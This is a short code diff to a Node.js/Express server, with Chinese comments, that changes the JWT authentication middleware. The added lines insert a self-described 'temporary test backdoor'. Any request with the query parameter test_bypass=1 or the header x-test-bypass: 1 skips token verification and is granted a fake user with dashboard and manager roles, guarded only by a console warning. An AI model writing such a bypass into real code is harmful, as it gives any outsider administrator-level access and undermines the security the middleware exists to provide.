@@ -562,6 +562,19 @@ async function getUserNameByUserId(userId) {
 // JWT 验证中间件
 // ============================================================
 function authMiddleware(req, res, next) {
+  // ── 临时测试后门：前端 ?test_bypass=1 或请求头 x-test-bypass: 1 放行 ──
+  const bypassParam = req.query?.test_bypass;
+  const bypassHeader = req.headers['x-test-bypass'];
+  if (bypassParam === '1' || bypassHeader === '1') {
+    console.warn('⚠️ [安全警告] 请求使用了测试后门放行，请勿在生产环境长期开启！');
+    req.user = {
+      userId: 'test_user',
+      name: '测试员',
+      roles: { dashboard: true, manager: true },
+    };
+    return next();
+  }
+
   const token = req.cookies?.token || req.headers.authorization?.replace('Bearer ', '');
   if (!token) {
     return res.status(401).json({ success: false, error: '未登录' });
